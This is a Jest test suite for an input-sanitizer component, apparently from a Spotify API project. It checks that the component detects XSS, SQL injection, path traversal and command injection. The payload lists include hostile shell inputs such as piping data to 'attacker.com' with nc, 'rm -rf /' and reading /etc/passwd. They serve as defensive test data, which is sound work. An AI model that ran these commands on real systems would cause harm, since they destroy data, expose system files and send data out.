/**
 * Comprehensive tests for InputSanitizer security component
 * Tests XSS protection, SQL injection prevention, command injection blocking, and input validation
 */

import { jest } from '@jest/globals';
import { InputSanitizer, type SanitizationConfig, SecureZodSchema } from '../../../src/security/inputSanitizer.js';
import type { Logger } from '../../../src/types/index.js';

describe('InputSanitizer', () => {
  let sanitizer: InputSanitizer;
  let mockLogger: Logger;

  const defaultConfig: Partial<SanitizationConfig> = {
    enabled: true,
    maxStringLength: 1000,
    maxArrayLength: 100,
    allowedCharacterSets: {},
    blockedPatterns: [],
    strictMode: true,
  };

  beforeEach(() => {
    mockLogger = {
      debug: jest.fn(),
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
    };

    sanitizer = new InputSanitizer(defaultConfig, mockLogger);
    SecureZodSchema.initialize(sanitizer);
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('Constructor and Configuration', () => {
    it('should initialize with default configuration', () => {
      expect(mockLogger.info).toHaveBeenCalledWith(
        'Input sanitizer initialized',
        expect.objectContaining({
          enabled: true,
          maxStringLength: 1000,
          strictMode: true,
        })
      );
    });

    it('should use production defaults when NODE_ENV is production', () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'production';

      const prodSanitizer = new InputSanitizer({}, mockLogger);
      expect(mockLogger.info).toHaveBeenCalledWith(
        'Input sanitizer initialized',
        expect.objectContaining({
          strictMode: true,
        })
      );

      process.env.NODE_ENV = originalEnv;
    });

    it('should allow disabling the sanitizer', () => {
      const disabledSanitizer = new InputSanitizer({ enabled: false }, mockLogger);
      
      const result = disabledSanitizer.sanitize('<script>alert("xss")</script>');
      
      expect(result.safe).toBe(true);
      expect(result.sanitized).toBe('<script>alert("xss")</script>'); // Not sanitized when disabled
    });
  });

  describe('XSS Protection', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      'javascript:alert("xss")',
      '<iframe src="javascript:alert(\'xss\')"></iframe>',
      '<img onerror="alert(\'xss\')" src="invalid">',
      '<link rel="stylesheet" href="javascript:alert(\'xss\')">',
      '<meta http-equiv="refresh" content="0; url=javascript:alert(\'xss\')">',
      '<object data="javascript:alert(\'xss\')"></object>',
      '<embed src="javascript:alert(\'xss\')">',
      'onclick="alert(\'xss\')"',
      'onmouseover="alert(\'xss\')"',
    ];

    it('should detect XSS patterns in strict mode', () => {
      xssPayloads.forEach(payload => {
        const result = sanitizer.sanitize(payload, 'xss-test');
        expect(result.safe).toBe(false);
        expect(result.blocked).toContain('potentially malicious patterns');
      });
    });

    it('should sanitize XSS patterns in non-strict mode', () => {
      const lenientSanitizer = new InputSanitizer({ ...defaultConfig, strictMode: false }, mockLogger);
      
      xssPayloads.forEach(payload => {
        const result = lenientSanitizer.sanitize(payload, 'xss-test');
        expect(result.safe).toBe(true);
        expect(result.warnings.length).toBeGreaterThan(0);
        expect(result.sanitized as string).not.toContain('<script>');
        expect(result.sanitized as string).not.toContain('javascript:');
      });
    });
  });

  describe('SQL Injection Protection', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      '1 OR 1=1',
      'UNION SELECT * FROM users',
      'INSERT INTO users VALUES',
      'DELETE FROM users WHERE',
      'UPDATE users SET password',
      'CREATE TABLE malicious',
      'ALTER TABLE users',
      'EXEC sp_executesql',
      'EXECUTE immediate',
      '/* malicious comment */',
      '-- sql comment',
    ];

    it('should detect SQL injection patterns in strict mode', () => {
      sqlInjectionPayloads.forEach(payload => {
        const result = sanitizer.sanitize(payload, 'sql-test');
        expect(result.safe).toBe(false);
        expect(result.blocked).toContain('potentially malicious patterns');
      });
    });

    it('should sanitize SQL injection patterns in non-strict mode', () => {
      const lenientSanitizer = new InputSanitizer({ ...defaultConfig, strictMode: false }, mockLogger);
      
      sqlInjectionPayloads.forEach(payload => {
        const result = lenientSanitizer.sanitize(payload, 'sql-test');
        expect(result.safe).toBe(true);
        expect(result.warnings.length).toBeGreaterThan(0);
        // Ensure dangerous SQL keywords are removed
        const sanitized = result.sanitized as string;
        expect(sanitized.toLowerCase()).not.toMatch(/\b(drop|union|insert|delete|update|create|alter|exec|execute)\b/);
      });
    });
  });

  describe('Command Injection Protection', () => {
    const commandInjectionPayloads = [
      'test && rm -rf /',
      'test; cat /etc/passwd',
      'test | nc attacker.com 4444',
      'test `whoami`',
      'test $(id)',
      'test & echo vulnerable',
      'test{test}',
      'test[test]',
      'test\\malicious',
    ];

    it('should detect command injection patterns', () => {
      commandInjectionPayloads.forEach(payload => {
        const result = sanitizer.sanitize(payload, 'command-test');
        expect(result.safe).toBe(false);
        expect(result.blocked).toContain('potentially malicious patterns');
      });
    });
  });

  describe('Path Traversal Protection', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '%2e%2e\\%2e%2e\\%2e%2e\\windows\\system32',
      '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
    ];

    it('should detect path traversal patterns', () => {
      pathTraversalPayloads.forEach(payload => {
        const result = sanitizer.sanitize(payload, 'path-test');
        expect(result.safe).toBe(false);
        expect(result.blocked).toContain('potentially malicious patterns');
      });
    });
  });

  describe('Spotify URI Validation', () => {
    it('should validate correct Spotify URIs', () => {
      const validUris = [
        'spotify:track:1234567890123456789012',
        'spotify:album:abcdefghijklmnopqrstuvwx',
        'spotify:artist:ABCDEFGHIJKLMNOPQRSTUVWX',
        'spotify:playlist:1A2b3C4d5E6f7G8h9I0j1K',
        'spotify:show:podcast123456789012345678',
        'spotify:episode:episode12345678901234567',
      ];

      validUris.forEach(uri => {
        const result = sanitizer.validateSpotifyUri(uri);
        expect(result.valid).toBe(true);
        expect(result.type).toBeDefined();
        expect(result.id).toBeDefined();
        expect(result.error).toBeUndefined();
      });
    });

    it('should reject invalid Spotify URIs', () => {
      const invalidUris = [
        'spotify:invalid:1234567890123456789012',
        'spotify:track:tooshort',
        'spotify:track:toolongtobevalid123456789012345',
        'spotify:track:invalid-chars!@#$%^&*()',
        'not-a-spotify-uri',
        '',
        'spotify:track:', // missing ID
        'track:1234567890123456789012', // missing spotify: prefix
      ];

      invalidUris.forEach(uri => {
        const result = sanitizer.validateSpotifyUri(uri);
        expect(result.valid).toBe(false);
        expect(result.error).toBeDefined();
      });
    });

    it('should detect malicious patterns in Spotify URIs', () => {
      const maliciousUris = [
        'spotify:track:<script>alert("xss")</script>',
        'spotify:track:../../../etc/passwd',
        'spotify:track:1234567890123456789012; rm -rf /',
      ];

      maliciousUris.forEach(uri => {
        const result = sanitizer.validateSpotifyUri(uri);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('potentially malicious patterns');
      });
    });
  });

  describe('Search Query Sanitization', () => {
    it('should sanitize valid search queries', () => {
      const validQueries = [
        'The Beatles',
        'Rock music 2023',
        'Artist: "Taylor Swift"',
        'Album (Deluxe Edition)',
        'Song & Artist',
      ];

      validQueries.forEach(query => {
        const result = sanitizer.sanitizeSearchQuery(query);
        expect(result.sanitized).toBeDefined();
        expect(result.warnings.length).toBe(0);
      });
    });

    it('should truncate overly long search queries', () => {
      const longQuery = 'A'.repeat(2000);
      const result = sanitizer.sanitizeSearchQuery(longQuery);
      
      expect(result.sanitized.length).toBe(1000); // maxStringLength
      expect(result.warnings).toContain('Query truncated to 1000 characters');
    });

    it('should remove control characters from search queries', () => {
      const queryWithControlChars = 'Valid Query\x00\x01\x02Invalid';
      const result = sanitizer.sanitizeSearchQuery(queryWithControlChars);
      
      expect(result.sanitized).toBe('Valid QueryInvalid');
      expect(result.warnings).toContain('Removed control characters from query');
    });

    it('should handle malicious search queries in strict mode', () => {
      const maliciousQueries = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE songs; --",
        'test && rm -rf /',
      ];

      maliciousQueries.forEach(query => {
        expect(() => {
          sanitizer.sanitizeSearchQuery(query);
        }).toThrow('potentially malicious patterns');
      });
    });

    it('should sanitize malicious search queries in non-strict mode', () => {
      const lenientSanitizer = new InputSanitizer({ ...defaultConfig, strictMode: false }, mockLogger);
      
      const result = lenientSanitizer.sanitizeSearchQuery('<script>alert("xss")</script>');
      expect(result.sanitized).not.toContain('<script>');
      expect(result.warnings.length).toBeGreaterThan(0);
    });
  });

  describe('Device ID Validation', () => {
    it('should validate correct device IDs', () => {
      const validDeviceIds = [
        'device123',
        'spotify-device-12345',
        'ABCD-1234-EFGH-5678',
        'user_device_001',
      ];

      validDeviceIds.forEach(deviceId => {
        const result = sanitizer.sanitizeDeviceId(deviceId);
        expect(result.sanitized).toBe(deviceId);
        expect(result.warnings.length).toBe(0);
      });
    });

    it('should reject device IDs that are too long', () => {
      const longDeviceId = 'A'.repeat(101);
      
      expect(() => {
        sanitizer.sanitizeDeviceId(longDeviceId);
      }).toThrow('Device ID too long');
    });

    it('should reject device IDs with invalid characters', () => {
      const invalidDeviceIds = [
        'device<script>',
        'device with spaces',
        'device@invalid.com',
        'device!@#$%^&*()',
      ];

      invalidDeviceIds.forEach(deviceId => {
        expect(() => {
          sanitizer.sanitizeDeviceId(deviceId);
        }).toThrow('Device ID contains invalid characters');
      });
    });
  });

  describe('Complex Data Structure Sanitization', () => {
    it('should sanitize nested objects', () => {
      const complexObject = {
        user: {
          name: 'John Doe',
          query: '<script>alert("xss")</script>',
          preferences: {
            genre: 'rock',
            malicious: '"; DROP TABLE users; --',
          },
        },
        playlist: ['song1', 'song2', '<iframe src="javascript:alert()">'],
      };

      const result = sanitizer.sanitize(complexObject, 'complex-object');
      
      if (result.safe) {
        const sanitized = result.sanitized as any;
        expect(sanitized.user.name).toBe('John Doe');
        expect(sanitized.user.query).not.toContain('<script>');
        expect(sanitized.user.preferences.genre).toBe('rock');
        expect(sanitized.playlist).toHaveLength(3);
      } else {
        // In strict mode, it should be blocked
        expect(result.blocked).toContain('potentially malicious patterns');
      }
    });

    it('should truncate large arrays', () => {
      const largeArray = Array(150).fill('item');
      const result = sanitizer.sanitize(largeArray, 'large-array');
      
      expect(result.safe).toBe(true);
      expect((result.sanitized as unknown[]).length).toBe(100); // maxArrayLength
      expect(result.warnings).toContain('Array truncated in large-array');
    });

    it('should handle null and undefined values', () => {
      const dataWithNulls = {
        validField: 'test',
        nullField: null,
        undefinedField: undefined,
      };

      const result = sanitizer.sanitize(dataWithNulls, 'null-test');
      
      expect(result.safe).toBe(true);
      const sanitized = result.sanitized as any;
      expect(sanitized.validField).toBe('test');
      expect(sanitized.nullField).toBeNull();
      expect(sanitized.undefinedField).toBeUndefined();
    });
  });

  describe('Custom Blocked Patterns', () => {
    it('should block custom patterns', () => {
      const customConfig = {
        ...defaultConfig,
        blockedPatterns: [/malicious/gi, /forbidden/gi],
      };
      
      const customSanitizer = new InputSanitizer(customConfig, mockLogger);
      
      const result = customSanitizer.sanitize('This contains malicious content', 'custom-test');
      expect(result.safe).toBe(false);
      expect(result.blocked).toContain('potentially malicious patterns');
    });
  });

  describe('Zod Schema Integration', () => {
    it('should work with secure string schema', () => {
      const schema = SecureZodSchema.secureString({ maxLength: 50, context: 'test-field' });
      
      const validResult = schema.safeParse('valid input');
      expect(validResult.success).toBe(true);
      
      const invalidResult = schema.safeParse('<script>alert("xss")</script>');
      expect(invalidResult.success).toBe(false);
    });

    it('should work with Spotify URI schema', () => {
      const schema = SecureZodSchema.spotifyUri();
      
      const validResult = schema.safeParse('spotify:track:1234567890123456789012');
      expect(validResult.success).toBe(true);
      
      const invalidResult = schema.safeParse('invalid:uri');
      expect(invalidResult.success).toBe(false);
    });

    it('should work with search query schema', () => {
      const schema = SecureZodSchema.searchQuery();
      
      const validResult = schema.safeParse('The Beatles');
      expect(validResult.success).toBe(true);
      
      const invalidResult = schema.safeParse('<script>alert("xss")</script>');
      expect(invalidResult.success).toBe(false);
    });
  });

  describe('Performance and Edge Cases', () => {
    it('should handle empty strings', () => {
      const result = sanitizer.sanitize('', 'empty-test');
      expect(result.safe).toBe(true);
      expect(result.sanitized).toBe('');
    });

    it('should handle very large inputs efficiently', () => {
      const largeInput = 'A'.repeat(5000);
      const startTime = Date.now();
      
      const result = sanitizer.sanitize(largeInput, 'performance-test');
      const endTime = Date.now();
      
      expect(endTime - startTime).toBeLessThan(100); // Should complete within 100ms
      expect(result.safe).toBe(true);
      expect((result.sanitized as string).length).toBe(1000); // Truncated to maxStringLength
    });

    it('should handle special characters correctly', () => {
      const specialChars = '!@#$%^&*()_+-=[]{}|;:,.<>?';
      const result = sanitizer.sanitize(specialChars, 'special-chars');
      
      // Should not be blocked unless it matches security patterns
      expect(result.safe).toBe(true);
    });

    it('should log appropriate warnings and errors', () => {
      const maliciousInput = '<script>alert("xss")</script>';
      sanitizer.sanitize(maliciousInput, 'logging-test');
      
      expect(mockLogger.error).toHaveBeenCalledWith(
        'Input blocked by sanitizer',
        expect.objectContaining({
          context: 'logging-test',
        })
      );
    });
  });

  describe('Configuration Validation', () => {
    it('should handle unsupported input types', () => {
      const unsupportedInput = () => 'function'; // Function type
      const result = sanitizer.sanitize(unsupportedInput, 'unsupported-test');
      
      expect(result.safe).toBe(false);
      expect(result.blocked).toContain('Unsupported input type');
    });

    it('should respect character set restrictions', () => {
      const restrictiveConfig = {
        ...defaultConfig,
        allowedCharacterSets: {
          'test-context': /^[a-zA-Z0-9\s]+$/,
        },
      };
      
      // This would require implementing character set validation in the actual component
      // For now, we test that the configuration is accepted
      expect(() => {
        new InputSanitizer(restrictiveConfig, mockLogger);
      }).not.toThrow();
    });
  });
});